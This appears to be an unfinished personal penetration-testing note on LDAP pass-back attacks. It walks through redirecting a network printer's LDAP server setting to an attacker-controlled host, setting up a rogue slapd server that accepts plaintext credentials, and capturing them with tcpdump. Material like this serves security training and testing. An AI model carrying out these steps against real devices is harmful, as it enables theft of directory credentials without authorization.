
This is a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom.

[[LDAP]] Pass-back attacks can be performed when we gain access to a device's configuration where the [[LDAP]] parameters are specified. This can be, for example, the web interface of a network printer. Usually, the credentials for these interfaces are kept to the default ones, such as admin:admin or admin:password. 

Here, we won't be able to directly extract the LDAP credentials since the password is usually hidden. However, we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.


# 📔 Description

- Change the LDAP IP configured in the device we have obtained access to, to our IP
- Host a listening server, you can use netcat on port 389 but if the device uses a more secure protocol you won't see the password in plaintext.
- If netcat can't be used, create your own LDAP listening server:

1. Run the command:

`sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd
`
2. Configure slapd

`sudo dpkg-reconfigure -p low slapd
`
3. Configure the server mimicking the details as the real LDAP server
4. Ensure to have these details set:

	- MDB as database
	- Database not removed when purged
	- Move old database -> yes

5. Finally you need to make the server vulnerable to store passwords in plain text. Create a file name olcSaslSecProps.ldif with these details:

```
#olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

6. Run:

`sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
`
7. Reload the device settings page or test them and now capture the credentials with:

`sudo tcpdump -SX -i [name of interface] tcp port 389`



##  📗 Action to perform 

1. 


### Properties
---
📆 created   {{26-10-2023}} 19:42
🏷️ tags: #activedirectory  #enumeration 
---

